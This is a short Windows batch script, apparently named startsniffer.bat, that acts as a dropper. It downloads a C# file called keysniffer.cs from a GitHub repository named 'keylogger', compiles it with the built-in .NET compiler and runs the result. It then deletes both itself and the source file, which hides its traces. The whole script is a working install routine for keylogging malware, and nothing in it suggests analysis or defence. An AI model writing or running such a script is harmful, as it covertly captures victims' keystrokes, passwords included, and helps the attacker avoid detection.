@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/keysniffer.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe keysniffer.cs
keysniffer.exe & erase startsniffer.bat & erase keysniffer.cs 
